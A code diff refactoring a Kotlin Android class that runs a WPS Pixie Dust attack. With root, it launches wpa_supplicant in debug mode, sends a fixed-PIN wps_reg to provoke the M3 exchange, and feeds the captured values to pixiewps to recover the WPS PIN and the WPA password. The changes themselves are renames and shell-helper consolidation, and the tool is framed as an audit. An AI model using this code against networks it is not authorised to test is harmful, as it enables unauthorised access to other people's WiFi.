@@ -9,6 +9,7 @@ package com.hitomatito.amwf.wifi.pixiedust
 
 import android.content.Context
 import android.util.Log
+import com.hitomatito.amwf.ShellExecutor
 import java.io.BufferedReader
 import java.io.DataOutputStream
 import java.io.File
@@ -30,7 +31,7 @@ import kotlinx.coroutines.withTimeout
  *   2. Opcionalmente desactiva el WiFi del sistema (svc wifi disable) para liberar la interfaz.
  *   3. Lanza su propio wpa_supplicant con -K -d para volcar claves WPS por debug.
  *   4. Espera el socket de control y verifica respuesta PONG vía wpa_cli.
- *   5. Envía wps_reg con un PIN trampa para provocar el intercambio M3.
+ *   5. Envía wps_reg con un PIN conocido para provocar el intercambio M3.
  *   6. Parsea los 6 campos M3 (E-Nonce, PKE, PKR, AuthKey, E-Hash1, E-Hash2).
  *   7. Ejecuta pixiewps con esos argumentos y recupera el PIN WPS.
  *   8. Opcionalmente obtiene el PSK WPA mediante provisión WPS con el PIN hallado.
@@ -63,8 +64,8 @@ class PixieDustRunner(
     private val PSK_EXTRACT_TIMEOUT_MS = 45_000L
     private val PSK_WAIT_MS = 25_000L
 
-    // PIN trampa para provocar el intercambio WPS M3.
-    private val TRAP_PIN = "12345670"
+    // PIN conocido usado para el registro wps_reg (provoca el intercambio M3).
+    private val WPS_REG_PIN_DEFAULT = "12345670"
 
     /**
      * Ejecuta una auditoría Pixie Dust contra el BSSID dado.
@@ -197,8 +198,8 @@ class PixieDustRunner(
                 val m5m7Local = m5m7
                 log("[*] Pixiewps mode 3 (RTL819x): M5=${m5m7Local?.m5Enc?.length ?: 0} hex, M7=${m5m7Local?.m7Enc?.length ?: 0} hex")
             } else {
-                val m3Local = m3Data
-                log("[*] Pixiewps args: ${m3Local?.toPixiewpsArgs() ?: "<no data>"}")
+                val m3Local = m3Data!!
+                log("[*] Pixiewps args: ${m3Local.toPixiewpsArgs()}")
             }
 
             // --- Ejecutar pixiewps ---
@@ -315,7 +316,7 @@ class PixieDustRunner(
                 "cd $dir && export LD_LIBRARY_PATH=$dir && $wpaCli -p$ctrlDir -i $iface ping",
                 timeoutSeconds = 3
             )
-            if (r != null && r.exitCode == 0 && r.output.lines().any { it.trim() == "PONG" }) {
+            if (r.exitCode == 0 && r.output.lines().any { it.trim() == "PONG" }) {
                 log("[+] wpa_supplicant ctrl interface ready (PONG)")
                 return true
             }
@@ -344,7 +345,7 @@ class PixieDustRunner(
                 delay(1000)
             }
 
-            log("[*] Sending wps_reg with PIN $TRAP_PIN...")
+            log("[*] Sending wps_reg with PIN $WPS_REG_PIN_DEFAULT...")
             val regResult = sendWpsReg(bssid, interfaceName, freqMHz, log)
             rawOutput.append(regResult.output).append("\n")
 
@@ -395,17 +396,17 @@ class PixieDustRunner(
         iface: String,
         freqMHz: Int?,
         log: (String) -> Unit
-    ): SuResult {
+    ): ShellExecutor.Result {
         val dir = NativeBinaries.binaryDir(context)
         val ctrlDir = NativeBinaries.ctrlDir()
         val wpaCli = "./${NativeBinaries.wpaCliAssetName()}"
         val freqSuffix = if (freqMHz != null) " freq=$freqMHz" else ""
-        val cmd = "cd $dir && export LD_LIBRARY_PATH=$dir && $wpaCli -p$ctrlDir -i $iface wps_reg $bssid $TRAP_PIN$freqSuffix"
+        val cmd = "cd $dir && export LD_LIBRARY_PATH=$dir && $wpaCli -p$ctrlDir -i $iface wps_reg $bssid $WPS_REG_PIN_DEFAULT$freqSuffix"
         log("[*] wpa_cli (wps_reg): $cmd")
         return runSuWithTimeout(cmd, timeoutSeconds = 5)
     }
 
-    private fun isWpsRegAccepted(result: SuResult): Boolean =
+    private fun isWpsRegAccepted(result: ShellExecutor.Result): Boolean =
         result.exitCode == 0 && result.output.lines().any { it.trim() == "OK" }
 
     private fun runPixieCommand(command: String, rawOutput: StringBuilder): String? {
@@ -507,7 +508,7 @@ class PixieDustRunner(
 
             val dir = NativeBinaries.binaryDir(context)
             val wpaCli = "./${NativeBinaries.wpaCliAssetName()}"
-            fun cli(cmd: String): SuResult =
+            fun cli(cmd: String): ShellExecutor.Result =
                 runSuWithTimeout("cd $dir && export LD_LIBRARY_PATH=$dir && $wpaCli -p$ctrlDir -i $iface $cmd", timeoutSeconds = 5)
 
             var netId = "0"
@@ -554,7 +555,7 @@ class PixieDustRunner(
         }
     }
 
-    private fun extractPskValue(result: SuResult): String? {
+    private fun extractPskValue(result: ShellExecutor.Result): String? {
         if (result.exitCode != 0) return null
         val line = result.output.lines().firstOrNull { l ->
             val t = l.trim()
@@ -575,7 +576,7 @@ class PixieDustRunner(
                 .map { it.trim() }
                 .filter { it.startsWith("psk=") }
                 .map { it.removePrefix("psk=").trim('"').trim() }
-                .firstOrNull { it.isNotEmpty() }
+                .firstOrNull { it.isNotBlank() }
         } catch (e: Exception) {
             null
         }
@@ -584,6 +585,24 @@ class PixieDustRunner(
     // ========================================================================
     // Utilidades de shell y limpieza
     // ========================================================================
+
+    /**
+     * Ejecuta un comando vía su y retorna el resultado.
+     * Reusa ShellExecutor.execRoot (eliminada duplicación con PixieDustViewModel).
+     */
+    private fun execSu(command: String, timeoutSeconds: Int): ShellExecutor.Result =
+        ShellExecutor.execRoot(command, timeoutSeconds * 1000L)
+
+    private fun runSuWithTimeout(command: String, timeoutSeconds: Int): ShellExecutor.Result {
+        return try {
+            val wrapped =
+                "($command & pid=\$!; ( sleep $timeoutSeconds; kill \$pid 2>/dev/null ) & wait \$pid)"
+            ShellExecutor.execRoot(wrapped, timeoutSeconds * 1000L)
+        } catch (e: Exception) {
+            Log.w(TAG, "Command failed/timed out: $command", e)
+            ShellExecutor.Result(-1, "", e.message ?: "Unknown error")
+        }
+    }
 
     private fun waitForSocket(
         socketPath: String,
@@ -612,52 +631,6 @@ class PixieDustRunner(
         return false
     }
 
-    /**
-     * Ejecuta un comando vía su y retorna el resultado.
-     */
-    private fun execSu(command: String, timeoutSeconds: Int): SuResult =
-        runSuWithTimeout(command, timeoutSeconds)
-
-    private fun runSuWithTimeout(command: String, timeoutSeconds: Int): SuResult {
-        return try {
-            val wrapped =
-                "($command & pid=\$!; ( sleep $timeoutSeconds; kill \$pid 2>/dev/null ) & wait \$pid)"
-            execSuRaw(wrapped, timeoutSeconds)
-        } catch (e: Exception) {
-            Log.w(TAG, "Command failed/timed out: $command", e)
-            SuResult(-1, "", e.message ?: "Unknown error")
-        }
-    }
-
-    private fun execSuRaw(command: String, timeoutSeconds: Int): SuResult {
-        var process: java.lang.Process? = null
-        return try {
-            process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
-            val output = StringBuilder()
-            val error = StringBuilder()
-            val outThread = Thread {
-                BufferedReader(InputStreamReader(process!!.inputStream)).forEachLine { output.appendLine(it) }
-            }
-            val errThread = Thread {
-                BufferedReader(InputStreamReader(process!!.errorStream)).forEachLine { error.appendLine(it) }
-            }
-            outThread.isDaemon = true
-            errThread.isDaemon = true
-            outThread.start()
-            errThread.start()
-
-            val finished = process.waitFor(timeoutSeconds.toLong(), TimeUnit.SECONDS)
-            outThread.join(1000)
-            errThread.join(1000)
-            if (!finished) process.destroyForcibly()
-            SuResult(if (finished) process.exitValue() else -1, output.toString().trim(), error.toString().trim())
-        } catch (e: Exception) {
-            SuResult(-1, "", e.message ?: "Unknown error")
-        } finally {
-            try { process?.destroyForcibly() } catch (_: Exception) {}
-        }
-    }
-
     private fun cleanup(wifiDisabledByAttack: Boolean, log: (String) -> Unit) {
         try {
             val dir = NativeBinaries.binaryDir(context)
@@ -678,12 +651,6 @@ class PixieDustRunner(
     // ========================================================================
     // Clases de soporte internas
     // ========================================================================
-
-    private data class SuResult(
-        val exitCode: Int,
-        val output: String,
-        val error: String = ""
-    )
 
     private data class M3Attempt(
         val data: M3Parser.M3Data?,
